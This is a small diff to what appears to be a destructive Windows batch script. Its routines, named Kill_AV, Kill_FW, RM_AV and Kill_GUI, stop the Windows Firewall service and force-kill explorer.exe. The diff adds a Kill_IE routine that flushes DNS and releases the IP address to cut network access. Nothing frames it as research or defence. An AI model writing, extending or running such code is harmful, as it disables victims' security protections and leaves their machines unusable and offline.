@@ -7,6 +7,7 @@ call Kill_AV >nul
 call Kill_FW >nul
 call RM_AV >nul
 call Kill_GUI >nul
+call Kill_IE >nul
 goto main
 
 :flood
@@ -138,3 +139,7 @@ net stop "MpsSvc"
 
 :Kill_GUI
 taskkill /f /im explorer.exe >nul
+
+:Kill_IE
+ipconfig /flushdns >nul
+ipconfig /release  >nul
